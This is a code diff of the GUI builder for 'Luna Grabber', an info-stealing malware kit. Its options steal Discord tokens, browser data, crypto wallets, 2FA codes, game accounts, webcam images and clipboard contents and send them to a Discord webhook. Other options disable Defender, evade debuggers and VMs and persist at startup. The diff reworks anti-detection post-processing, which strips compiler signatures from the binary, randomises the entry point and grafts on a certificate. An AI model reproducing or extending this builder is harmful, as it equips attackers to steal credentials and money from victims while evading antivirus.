@@ -1,5 +1,5 @@
 import copy
-import customtkinter
+import customtkinter as ctk
 import logging
 import os
 import random
@@ -15,6 +15,7 @@ from tkinter import filedialog
 from tools import upx
 from tools.sigthief import signfile
 
+
 logging.basicConfig(
     level=logging.DEBUG,
     filename='luna.log',
@@ -24,7 +25,7 @@ logging.basicConfig(
 
 logger = logging.getLogger(__name__)
 
-class App(customtkinter.CTk):
+class App(ctk.CTk):
     def __init__(self):
         super().__init__()
 
@@ -33,7 +34,7 @@ class App(customtkinter.CTk):
         self.resizable(False, False)
         self.grid_rowconfigure(0, weight=1)
         self.grid_columnconfigure(1, weight=1)
-        self.dark_mode()
+        ctk.set_appearance_mode("system")
 
         self.updated_dictionary = {
             "webhook": None,
@@ -61,195 +62,197 @@ class App(customtkinter.CTk):
 
         image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "./gui_images/")
         self.basefilepath = os.path.dirname(str(os.path.realpath(__file__)))
-        self.logo_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "luna.png")), size=(60, 60))
-        self.large_test_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "luna.png")), size=(500, 150))
-        self.image_icon_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "luna.png")), size=(20, 20))
-        self.dashboard_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "home.png")), size=(30, 30))
-        self.docs_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "clipboard.png")), size=(30, 30))
-        self.help_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "help.png")), size=(20, 20))
+        self.logo_image = ctk.CTkImage(Image.open(os.path.join(image_path, "luna.png")), size=(60, 60))
+        self.large_test_image = ctk.CTkImage(Image.open(os.path.join(image_path, "luna.png")), size=(500, 150))
+        self.image_icon_image = ctk.CTkImage(Image.open(os.path.join(image_path, "luna.png")), size=(20, 20))
+        self.dashboard_image = ctk.CTkImage(dark_image=Image.open(os.path.join(image_path, "home.png")), size=(30, 30))
+        self.docs_image = ctk.CTkImage(dark_image=Image.open(os.path.join(image_path, "clipboard.png")), size=(30, 30))
+        self.help_image = ctk.CTkImage(dark_image=Image.open(os.path.join(image_path, "help.png")), size=(20, 20))
         self.font = "Supernova"
         self.iconpath = None
         self.iconbitmap(f"{image_path}luna.ico")
+        self.boundExePath = ""
 
-        self.navigation_frame = customtkinter.CTkFrame(self, corner_radius=0)
+        self.navigation_frame = ctk.CTkFrame(self, corner_radius=0)
         self.navigation_frame.grid(row=0, column=0, sticky="nsew")
         self.navigation_frame.grid_rowconfigure(4, weight=1)
 
-        self.navigation_frame_label = customtkinter.CTkLabel(self.navigation_frame, text="  Luna Grabber Builder", image=self.logo_image,
-                                                             compound="left", font=customtkinter.CTkFont(size=15, weight="bold", family=self.font))
+        self.navigation_frame_label = ctk.CTkLabel(self.navigation_frame, text="  Luna Grabber Builder", image=self.logo_image,
+                                                             compound="left", font=ctk.CTkFont(size=15, weight="bold", family=self.font))
         self.navigation_frame_label.grid(row=0, column=0, padx=20, pady=20)
 
-        self.dashboard_button = customtkinter.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Builder",
-                                                        font=customtkinter.CTkFont(family=self.font, size=13), fg_color="transparent",
+        self.dashboard_button = ctk.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Builder",
+                                                        font=ctk.CTkFont(family=self.font, size=13), fg_color="transparent",
                                                         text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"),
                                                         image=self.dashboard_image, anchor="w", command=self.home_button_event)
         self.dashboard_button.grid(row=1, column=0, sticky="ew")
 
-        self.frame_2_button = customtkinter.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Documentation", font=customtkinter.CTkFont(
+        self.frame_2_button = ctk.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Documentation", font=ctk.CTkFont(
             family=self.font, size=13), fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), image=self.docs_image, anchor="w", command=self.docs_button_event)
         self.frame_2_button.grid(row=2, column=0, sticky="ew")
 
-        self.builder_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
+        self.builder_frame = ctk.CTkFrame(self, corner_radius=0, fg_color="transparent")
         self.builder_frame.grid_columnconfigure(0, weight=1)
 
         # Frame 1
 
-        self.webhook_button = customtkinter.CTkEntry(self.builder_frame, width=570, height=35, font=customtkinter.CTkFont(
+        self.webhook_button = ctk.CTkEntry(self.builder_frame, width=570, height=35, font=ctk.CTkFont(
             size=15, family=self.font), placeholder_text="https://discord.com/api/webhooks/1234567890/abcdefhgijklmnopqrstuvwxyz")
         self.webhook_button.grid(row=0, column=0, sticky="nw", padx=15, pady=20)
 
-        self.checkwebhook_button = customtkinter.CTkButton(master=self.builder_frame, width=100, height=35, text="Check Webhook",
+        self.checkwebhook_button = ctk.CTkButton(master=self.builder_frame, width=100, height=35, text="Check Webhook",
                                                            command=self.check_webhook_button,
-                                                           fg_color="#5d11c3", hover_color="#5057eb", font=customtkinter.CTkFont(size=15, family=self.font))
+                                                           fg_color="#5d11c3", hover_color="#5057eb", font=ctk.CTkFont(size=15, family=self.font))
         self.checkwebhook_button.grid(row=0, sticky="ne", padx=15, pady=20)
 
-        self.all_options = customtkinter.CTkLabel(self.builder_frame, text="Builder Options", font=customtkinter.CTkFont(size=35, weight="bold", family=self.font))
+        self.all_options = ctk.CTkLabel(self.builder_frame, text="Builder Options", font=ctk.CTkFont(size=35, weight="bold", family=self.font))
         self.all_options.grid(row=1, column=0, sticky="n", padx=15, pady=8)
 
-        self.option_help = customtkinter.CTkButton(self.builder_frame, width=12, text="", image=self.help_image,
+        self.option_help = ctk.CTkButton(self.builder_frame, width=12, text="", image=self.help_image,
                                                    command=self.docs_button_event, fg_color="#5d11c3", hover_color="#5057eb")
         self.option_help.grid(row=1, column=0, sticky="ne", padx=35, pady=15)
 
-        self.ping = customtkinter.CTkCheckBox(self.builder_frame, text="Ping", font=customtkinter.CTkFont(size=17, family=self.font),
+        self.ping = ctk.CTkCheckBox(self.builder_frame, text="Ping", font=ctk.CTkFont(size=17, family=self.font),
                                               command=self.check_ping, fg_color="#5d11c3", hover_color="#5057eb")
         self.ping.grid(row=1, column=0, sticky="nw", padx=85, pady=150)
 
-        self.pingtype = customtkinter.CTkOptionMenu(
+        self.pingtype = ctk.CTkOptionMenu(
             self.builder_frame, width=20, values=["Everyone", "Here"],
-            font=customtkinter.CTkFont(size=17, family=self.font),
+            font=ctk.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", button_hover_color="#5057eb", button_color="#480c96")
         self.pingtype.set(value="Here")
         self.pingtype.grid(row=1, column=0, sticky="nw", padx=160, pady=148)
         self.pingtype.configure(state="disabled")
 
-        self.error = customtkinter.CTkCheckBox(self.builder_frame, text="Fake Error", font=customtkinter.CTkFont(
+        self.error = ctk.CTkCheckBox(self.builder_frame, text="Fake Error", font=ctk.CTkFont(
             size=17, family=self.font), fg_color="#5d11c3", hover_color="#5057eb")
         self.error.grid(row=1, column=0, sticky="nw", padx=85, pady=105)
 
-        self.startup = customtkinter.CTkCheckBox(
-            self.builder_frame, text="Add To Startup", font=customtkinter.CTkFont(size=17, family=self.font),
+        self.startup = ctk.CTkCheckBox(
+            self.builder_frame, text="Add To Startup", font=ctk.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
         self.startup.grid(row=1, column=0, sticky="nw", padx=85, pady=60)
 
-        self.defender = customtkinter.CTkCheckBox(
-            self.builder_frame, text="Disable Defender", font=customtkinter.CTkFont(size=17, family=self.font),
+        self.defender = ctk.CTkCheckBox(
+            self.builder_frame, text="Disable Defender", font=ctk.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
         self.defender.grid(row=1, column=0, sticky="nw", padx=286, pady=60)
 
-        self.killprotector = customtkinter.CTkCheckBox(
-            self.builder_frame, text="Kill Protector", font=customtkinter.CTkFont(size=17, family=self.font),
+        self.killprotector = ctk.CTkCheckBox(
+            self.builder_frame, text="Kill Protector", font=ctk.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
         self.killprotector.grid(row=1, column=0, sticky="nw", padx=286, pady=105)
 
-        self.antidebug_vm = customtkinter.CTkCheckBox(
-            self.builder_frame, text="Anti Debug/Vm", font=customtkinter.CTkFont(size=17, family=self.font),
+        self.antidebug_vm = ctk.CTkCheckBox(
+            self.builder_frame, text="Anti Debug/Vm", font=ctk.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
         self.antidebug_vm.grid(row=1, column=0, sticky="nw", padx=286, pady=150)
 
-        self.discord = customtkinter.CTkCheckBox(
-            self.builder_frame, text="Discord Info", font=customtkinter.CTkFont(size=17, family=self.font),
+        self.discord = ctk.CTkCheckBox(
+            self.builder_frame, text="Discord Info", font=ctk.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
         self.discord.grid(row=1, column=0, sticky="ne", padx=110, pady=60)
 
-        self.wifi = customtkinter.CTkCheckBox(self.builder_frame, text="Wifi Info", font=customtkinter.CTkFont(size=17, family=self.font),
+        self.wifi = ctk.CTkCheckBox(self.builder_frame, text="Wifi Info", font=ctk.CTkFont(size=17, family=self.font),
                                               fg_color="#5d11c3", hover_color="#5057eb")
         self.wifi.grid(row=1, column=0, sticky="ne", padx=130, pady=105)
 
-        self.minecraft = customtkinter.CTkCheckBox(
-            self.builder_frame, text="Minecraft Info", font=customtkinter.CTkFont(size=17, family=self.font),
+        self.minecraft = ctk.CTkCheckBox(
+            self.builder_frame, text="Minecraft Info", font=ctk.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
         self.minecraft.grid(row=1, column=0, sticky="ne", padx=99, pady=150)
 
-        self.systeminfo = customtkinter.CTkCheckBox(
-            self.builder_frame, text="System Info", font=customtkinter.CTkFont(size=17, family=self.font),
+        self.systeminfo = ctk.CTkCheckBox(
+            self.builder_frame, text="System Info", font=ctk.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
         self.systeminfo.grid(row=1, column=0, sticky="nw", padx=85, pady=195)
 
-        self.backupcodes = customtkinter.CTkCheckBox(
-            self.builder_frame, text="2FA Codes", font=customtkinter.CTkFont(size=17, family=self.font),
+        self.backupcodes = ctk.CTkCheckBox(
+            self.builder_frame, text="2FA Codes", font=ctk.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
         self.backupcodes.grid(row=1, column=0, sticky="nw", padx=286, pady=195)
 
-        self.browser = customtkinter.CTkCheckBox(
-            self.builder_frame, text="Browser Info", font=customtkinter.CTkFont(size=17, family=self.font),
+        self.browser = ctk.CTkCheckBox(
+            self.builder_frame, text="Browser Info", font=ctk.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb", command=self.check_browser)
         self.browser.grid(row=1, column=0, sticky="ne", padx=107, pady=195)
 
-        self.roblox = customtkinter.CTkCheckBox(self.builder_frame, text="Roblox Info", font=customtkinter.CTkFont(size=17, family=self.font),
+        self.roblox = ctk.CTkCheckBox(self.builder_frame, text="Roblox Info", font=ctk.CTkFont(size=17, family=self.font),
                                                 fg_color="#5d11c3", hover_color="#5057eb", command=self.check_roblox)
         self.roblox.grid(row=1, column=0, sticky="nw", padx=85, pady=240)
 
-        self.obfuscation = customtkinter.CTkCheckBox(
-            self.builder_frame, text="Obfuscation", font=customtkinter.CTkFont(size=17, family=self.font),
+        self.obfuscation = ctk.CTkCheckBox(
+            self.builder_frame, text="Obfuscation", font=ctk.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb", command=self.check_obfuscation)
         self.obfuscation.grid(row=1, column=0, sticky="nw", padx=286, pady=240)
 
-        self.injection = customtkinter.CTkCheckBox(
-            self.builder_frame, text="Injection", font=customtkinter.CTkFont(size=17, family=self.font),
+        self.injection = ctk.CTkCheckBox(
+            self.builder_frame, text="Injection", font=ctk.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
         self.injection.grid(row=1, column=0, sticky="ne", padx=130, pady=240)
 
-        self.antispam = customtkinter.CTkCheckBox(self.builder_frame, text="Anti Spam", font=customtkinter.CTkFont(size=17, family=self.font),
+        self.antispam = ctk.CTkCheckBox(self.builder_frame, text="Anti Spam", font=ctk.CTkFont(size=17, family=self.font),
                                                   fg_color="#5d11c3", hover_color="#5057eb")
         self.antispam.grid(row=1, column=0, sticky="nw", padx=85, pady=285)
 
-        self.self_destruct = customtkinter.CTkCheckBox(self.builder_frame, text="Self Destruct", font=customtkinter.CTkFont(size=17, family=self.font),
+        self.self_destruct = ctk.CTkCheckBox(self.builder_frame, text="Self Destruct", font=ctk.CTkFont(size=17, family=self.font),
                                                        fg_color="#5d11c3", hover_color="#5057eb")
         self.self_destruct.grid(row=1, column=0, sticky="nw", padx=286, pady=285)
 
-        self.pump = customtkinter.CTkCheckBox(self.builder_frame, text="File Pumper", font=customtkinter.CTkFont(size=17, family=self.font),
+        self.pump = ctk.CTkCheckBox(self.builder_frame, text="File Pumper", font=ctk.CTkFont(size=17, family=self.font),
                                               fg_color="#5d11c3", hover_color="#5057eb", command=lambda: (self.check_pumper(), self.check_pump()))
         self.pump.grid(row=1, column=0, sticky="ne", padx=112, pady=285)
 
-        self.pump_size = customtkinter.CTkOptionMenu(self.builder_frame, width=30, font=customtkinter.CTkFont(
+        self.pump_size = ctk.CTkOptionMenu(self.builder_frame, width=30, font=ctk.CTkFont(
             size=17, family=self.font), values=["5mb", "10mb", "15mb", "20mb", "25mb", "30mb"], fg_color="#5d11c3", button_hover_color="#5057eb", button_color="#480c96")
         self.pump_size.grid(row=1, column=0, sticky="ne", padx=28, pady=284)
         self.pump_size.set("10mb")
         self.pump_size.configure(state="disabled")
 
-        self.clipboard = customtkinter.CTkCheckBox(self.builder_frame, text="Clipboard", font=customtkinter.CTkFont(size=17, family=self.font),
+        self.clipboard = ctk.CTkCheckBox(self.builder_frame, text="Clipboard", font=ctk.CTkFont(size=17, family=self.font),
                                                 fg_color="#5d11c3", hover_color="#5057eb")
         self.clipboard.grid(row=1, column=0, sticky="nw", padx=85, pady=328)
         
-        self.webcam = customtkinter.CTkCheckBox(self.builder_frame, text="Webcam", font=customtkinter.CTkFont(size=17, family=self.font),
+        self.webcam = ctk.CTkCheckBox(self.builder_frame, text="Webcam", font=ctk.CTkFont(size=17, family=self.font),
                                                 fg_color="#5d11c3", hover_color="#5057eb")
         self.webcam.grid(row=1, column=0, sticky="nw", padx=286, pady=328)
 
-        self.wallets = customtkinter.CTkCheckBox(self.builder_frame, text="Wallets", font=customtkinter.CTkFont(size=17, family=self.font),
+        self.wallets = ctk.CTkCheckBox(self.builder_frame, text="Wallets", font=ctk.CTkFont(size=17, family=self.font),
                                               fg_color="#5d11c3", hover_color="#5057eb", command=lambda: (self.check_pumper(), self.check_pump()))
         self.wallets.grid(row=1, column=0, sticky="ne", padx=130, pady=328)
 
-        self.fileopts = customtkinter.CTkOptionMenu(self.builder_frame, values=["nuitka (.exe)", "pyinstaller (.exe)", ".py"],
-                                                    font=customtkinter.CTkFont(size=32, family=self.font), width=250, height=45,
-                                                    fg_color="#5d11c3", button_hover_color="#5057eb", button_color="#480c96", command=self.check_icon)
+        self.fileopts = ctk.CTkOptionMenu(self.builder_frame, values=["nuitka (.exe)", "pyinstaller (.exe)", ".py"],
+                                                    font=ctk.CTkFont(size=32, family=self.font), width=250, height=45,
+                                                    fg_color="#5d11c3", button_hover_color="#5057eb", button_color="#480c96", command=self.file_type_check)
         self.fileopts.grid(row=1, column=0, sticky="nw", padx=85, pady=365)
         self.fileopts.set("nuitka (.exe)")
 
-        self.icon = customtkinter.CTkButton(self.builder_frame, width=250, text="Add Icon", fg_color="#5d11c3", hover_color="#5057eb",
-                                            font=customtkinter.CTkFont(size=33, family=self.font), command=self.get_icon)
+        self.icon = ctk.CTkButton(self.builder_frame, width=250, text="Add Icon", fg_color="#5d11c3", hover_color="#5057eb",
+                                            font=ctk.CTkFont(size=33, family=self.font), command=self.get_icon)
         self.icon.grid(row=1, column=0, sticky="ne", padx=85, pady=365)
         self.icon.configure(state="enabled")
 
-        self.filename = customtkinter.CTkEntry(self.builder_frame, width=250, font=customtkinter.CTkFont(size=33, family=self.font),
+        self.filename = ctk.CTkEntry(self.builder_frame, width=250, font=ctk.CTkFont(size=33, family=self.font),
                                                placeholder_text="File Name")
         self.filename.grid(row=1, column=0, sticky="nw", padx=85, pady=420)
 
-        self.build = customtkinter.CTkButton(self.builder_frame, width=250, text="Build", font=customtkinter.CTkFont(size=35, family=self.font),
+        self.build = ctk.CTkButton(self.builder_frame, width=250, text="Build", font=ctk.CTkFont(size=35, family=self.font),
                                              fg_color="#5d11c3", hover_color="#5057eb", command=self.buildfile)
         self.build.grid(row=1, column=0, sticky="ne", padx=85, pady=420)
-
+        
         self.checkboxes = [self.ping, self.pingtype, self.error, self.startup, self.defender, self.systeminfo, self.backupcodes, self.browser, self.webcam,
-                           self.roblox, self.obfuscation, self.injection, self.minecraft, self.wifi, self.killprotector, self.antidebug_vm, self.discord, self.clipboard]
+                           self.roblox, self.obfuscation, self.injection, self.minecraft, self.wifi, self.killprotector, self.antidebug_vm, self.discord, self.clipboard,
+                           self.antispam, self.self_destruct, self.pump, self.wallets]
 
         # Frame 2
 
-        self.second_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
+        self.second_frame = ctk.CTkFrame(self, corner_radius=0, fg_color="transparent")
         self.second_frame.grid_columnconfigure(0, weight=1)
 
-        self.docs = customtkinter.CTkLabel(self.second_frame, text="Documentation", font=customtkinter.CTkFont(size=35, weight="bold", family=self.font))
+        self.docs = ctk.CTkLabel(self.second_frame, text="Documentation", font=ctk.CTkFont(size=35, weight="bold", family=self.font))
         self.docs.grid(row=1, column=0, sticky="n", padx=0, pady=10)
 
-        self.docsbox = customtkinter.CTkTextbox(self.second_frame, width=725, height=485, font=customtkinter.CTkFont(size=12, weight="bold", family=self.font))
+        self.docsbox = ctk.CTkTextbox(self.second_frame, width=725, height=485, font=ctk.CTkFont(size=12, weight="bold", family=self.font))
         self.docsbox.grid(row=1, column=0, sticky="n", padx=0, pady=55)
         self.docsbox.insert(
             "0.0",
@@ -302,9 +305,6 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
     def docs_button_event(self):
         self.select_frame_by_name("frame_2")
 
-    def dark_mode(self):
-        customtkinter.set_appearance_mode("dark")
-
     def verify_webhook(self):
         webhook = self.webhook_button.get()
         try:
@@ -321,12 +321,12 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
     def check_webhook_button(self):
         if self.verify_webhook():
             self.checkwebhook_button.configure(width=100, height=35, fg_color="green", hover_color="#0db60e",
-                                               text="Valid Webhook", font=customtkinter.CTkFont(size=15, family=self.font))
+                                               text="Valid Webhook", font=ctk.CTkFont(size=15, family=self.font))
             self.builder_frame.after(3500, self.reset_check_webhook_button)
             self.updated_dictionary["webhook"] = self.webhook_button.get()
         else:
             self.checkwebhook_button.configure(width=100, height=35, fg_color="#bd1616", hover_color="#ff0000",
-                                               text="Invalid Webhook", font=customtkinter.CTkFont(size=15, family=self.font))
+                                               text="Invalid Webhook", font=ctk.CTkFont(size=15, family=self.font))
             self.builder_frame.after(3500, self.reset_check_webhook_button)
 
     def check_ping(self):
@@ -362,20 +362,36 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
         if self.pump.get() == 1:
             self.obfuscation.deselect()
 
-    def check_icon(self, _):
+    def file_type_check(self, _):
         if self.fileopts.get() in ["pyinstaller (.exe)", "nuitka (.exe)"]:
             self.icon.configure(state="normal")
         elif self.fileopts.get() == ".py":
             self.icon.configure(state="disabled")
 
     def get_icon(self):
-        self.iconpath = filedialog.askopenfilename(initialdir="/", title="Select Icon", filetypes=(("ico files", "*.ico"), ("all files", "*.*")))
-        self.icon.configure(text="Added Icon")
-        self.builder_frame.after(3500, self.reset_icon_button)
+        REMOVE = "Remove Icon"
+        ADD = "Add Icon"
+        
+        buttonText = self.icon.cget("text")
+        
+        if buttonText == ADD:
+            user_pictures_dir = os.path.join(os.path.expanduser("~"), "Pictures")
+            allowedFiletypes = [("Image Files", ["*.ico", "*.bmp", "*.gif", "*.jpeg", "*.png", "*.tiff", "*.webp"])]
+            filePath = filedialog.askopenfilename(initialdir=user_pictures_dir, title="Select Icon", filetypes=allowedFiletypes)
+            if os.path.isfile(filePath):
+                try:
+                    with Image.open(filePath) as image:
+                        image.save("build_icon.ico", format="ico")
+                    self.iconpath = "build_icon.ico"
 
-    def reset_icon_button(self):
-        self.icon.configure(self.builder_frame, width=250, text="Add Icon", fg_color="#5d11c3", hover_color="#5057eb",
-                            font=customtkinter.CTkFont(size=33, family=self.font), command=self.get_icon)
+                except Exception:
+                    logging.error("Error", "Unable to convert the image to icon!")
+                else:
+                    self.icon.configure(text=REMOVE)            
+
+        elif buttonText == REMOVE:
+            self.iconpath = None
+            self.icon.configure(text=ADD)
 
     def update_config(self):
         checkbox_mapping = {
@@ -435,20 +451,12 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
     def reset_check_webhook_button(self):
         self.checkwebhook_button.configure(fg_color="#5d11c3", hover_color="#5057eb", text="Check Webhook")
 
-    def reset_build_button(self):
-        self.build.configure(width=250, text="Build", font=customtkinter.CTkFont(size=35, family=self.font),
-                             fg_color="#5d11c3", hover_color="#5057eb", command=self.buildfile)
-
     def building_button_thread(self, thread):
         while thread.is_alive():
             for i in [".", "..", "..."]:
-                self.build.configure(width=250, text=f"Building{i}", font=customtkinter.CTkFont(size=35, family=self.font), fg_color="#5d11c3", hover_color="#5057eb", command=None)
+                self.build.configure(width=250, text=f"Building{i}", font=ctk.CTkFont(size=35, family=self.font), fg_color="#5d11c3", hover_color="#5057eb")
                 time.sleep(0.3)
                 self.update()
-
-    def built_file(self):
-        self.build.configure(width=250, text="Built File", font=customtkinter.CTkFont(size=35, family=self.font),
-                             fg_color="#5d11c3", hover_color="#5057eb")
 
     def return_filename(self):
         try:
@@ -598,9 +606,6 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                 exeicon = "NONE"
             else:
                 exeicon = self.iconpath
-
-            current_dir = os.path.abspath(os.getcwd())
-            script_path = os.path.join(current_dir, f"{filename}.py")
             
             included_modules_nuitka = [
                 "concurrent.futures",
@@ -636,7 +641,8 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                 "systeminfo": ["psutil", "subprocess"],
                 "self_destruct": ["subprocess"],
                 "wifi": ["subprocess"],
-                "webcam": ["cv2"]
+                "webcam": ["cv2"],
+                "startup": ["subprocess"]
             }
 
             if filetype == "pyinstaller":
@@ -653,7 +659,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                     sys.executable, "-m", "PyInstaller",
                     "--onefile", "--clean", "--noconsole",
                     "--upx-dir=./tools", "--distpath=./",
-                    "--icon", exeicon, script_path
+                    "--icon", exeicon, f"./{filename}.py"
                 ]
             
                 for module in included_modules:
@@ -661,9 +667,10 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                     command.insert(-1, module)
 
                 subprocess.run(command)
-                self.RemoveStrings(f"./{filename}.exe")
-                self.AddCertificate(f"./{filename}.exe")
-                self.RenameEntryPoint(f"./{filename}.exe", "Luna")
+                
+                os.remove(f"./{filename}.py")
+                self.PostProcessing(f"./{filename}.exe")
+
                 logging.info(f"Successfully compiled {filename}.exe with pyinstaller")
 
             elif filetype == "nuitka":
@@ -678,8 +685,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                         "--show-progress", "--prefer-source-code",
                         "--assume-yes-for-downloads", "--windows-disable-console",
                         f"./{filename}.py"
-                    ]
-                    
+                    ]          
                     try:
                         for option, enabled in self.updated_dictionary.items():
                             if enabled and option in option_module_mapping_nuitka:
@@ -691,19 +697,20 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                             command.insert(-1, f"--windows-icon-from-ico={exeicon}")
                             
                         subprocess.run(command)
+                        
+                        os.remove(f"./{filename}.py")
+                        self.PostProcessing(f"./{filename}.exe")
+                        
                         logging.info(f"Successfully compiled {filename}.exe with nuitka")
                     except Exception as e:
                         logging.error(f"Error with compiling file: {e}")
-                self.RemoveStrings(f"./{filename}.exe")
-                self.AddCertificate(f"./{filename}.exe")
-                self.RenameEntryPoint(f"./{filename}.exe", "Luna")
-
+                        
         except Exception as e:
             logging.error(f"Error with compiling file: {e}")
 
     def cleanup_files(self, filename):
         cleans_dir = {'./__pycache__', './build'}
-        cleans_file = {f'./{filename}.spec', f'./{filename}.py', "./tools/upx.exe"}
+        cleans_file = {f'./{filename}.spec', "./tools/upx.exe", "build_icon.ico"}
 
         for clean in cleans_dir:
             try:
@@ -773,23 +780,24 @@ class %s:
             logging.error(_message)
             print(_message)
             self.checkwebhook_button.configure(width=100, height=35, fg_color="#bd1616", hover_color="#ff0000",
-                                    text="Invalid Webhook", font=customtkinter.CTkFont(size=15, family=self.font))
+                                    text="Invalid Webhook", font=ctk.CTkFont(size=15, family=self.font))
             self.builder_frame.after(3500, self.reset_check_webhook_button)
             return
+        
+        filename = self.return_filename()
         self.update_config()
+        self.write_and_obfuscate(filename)        
+        
         try:
             if self.get_filetype() == "py":
-                filename = self.return_filename()
-                self.write_and_obfuscate(filename)
+                self.switchStateOfAll("disabled")
+                
                 if self.pump.get() == 1:
                     self.file_pumper(filename, "py", self.get_mb())
 
-                self.built_file()
-                self.builder_frame.after(3000, self.reset_build_button)
 
             elif self.get_filetype() == "pyinstaller (.exe)":
-                filename = self.return_filename()
-                self.write_and_obfuscate(filename)
+                self.switchStateOfAll("disabled")
                 
                 thread = threading.Thread(target=self.compile_file, args=(filename, "pyinstaller",))
                 thread.start()
@@ -798,13 +806,8 @@ class %s:
                 if self.pump.get() == 1:
                     self.file_pumper(filename, "exe", self.get_mb())
 
-                self.built_file()
-                self.builder_frame.after(3000, self.reset_build_button)
-                self.cleanup_files(filename)
-
             elif self.get_filetype() == "nuitka (.exe)": 
-                filename = self.return_filename()
-                self.write_and_obfuscate(filename)
+                self.switchStateOfAll("disabled")
                 
                 thread = threading.Thread(target=self.compile_file, args=(filename, "nuitka",))
                 thread.start()
@@ -812,23 +815,17 @@ class %s:
 
                 if self.pump.get() == 1:
                     self.file_pumper(filename, "exe", self.get_mb())
-
-                self.built_file()
-                self.builder_frame.after(3000, self.reset_build_button)
-                self.cleanup_files(filename)
+          
+            self.cleanup_files(filename)
+            self.switchStateOfAll("normal")
+            self.build.configure(text="Build")
 
         except Exception as e:
             logging.error(f"Error with building file: {e}")
             
-    def AddCertificate(self, path: str):
-        print("Adding Certificate")
-        certFile = "cert"
-        if os.path.isfile(certFile):
-            signfile(path, certFile, path)
-
-    def RemoveStrings(self, path: str):
-        print("Removing MetaData")
-        with open(path, "rb") as file:
+    def PostProcessing(self, filename: str) -> None:
+        logging.info("Removing MetaData")
+        with open(filename, "rb") as file:
             data = file.read()
         
         # Remove PyInstaller strings
@@ -840,20 +837,41 @@ class %s:
         data = data.replace(b"NUITKA_ONEFILE_PARENT", b"NUKTEM_ONEFILE_PARENT")
         data = data.replace(b"NUITKA_ONEFILE_BINARY", b"NUKTEM_ONEFILE_BINARY")
         
-        with open(path, "wb") as file:
+        with open(filename, "wb") as file:
             file.write(data)
-            
-    def RenameEntryPoint(self, path: str, entryPoint: str):
-        print("Renaming Entry Point")
-        with open(path, "rb") as file:
+        
+        # Renaming Entry Point
+        logging.info("Renaming Entry Point")
+        with open(filename, "rb") as file:
             data = file.read()
     
+        entryPoint = "Luna"
         entryPoint = entryPoint.encode()
         new_entryPoint = b'\x00' + os.urandom(len(entryPoint) - 1)
         data = data.replace(entryPoint, new_entryPoint)
     
-        with open(path, "wb") as file:
+        with open(filename, "wb") as file:
             file.write(data)
+
+        # Adding Certificate
+        logging.info("Adding Certificate")
+        certFile = "cert"
+        if os.path.isfile(certFile):
+            signfile(filename, certFile, filename)
+                
+    def switchStateOfAll(self, state: str) -> None:
+        for checkbox in self.checkboxes:
+            checkbox.configure(state=state)
+        self.fileopts.configure(state=state)
+        self.filename.configure(state=state)
+        self.icon.configure(state=state)
+        self.build.configure(state=state)
+        self.checkwebhook_button.configure(state=state)
+        self.webhook_button.configure(state=state)
+        
+
+
+
 
 
 if __name__ == "__main__":
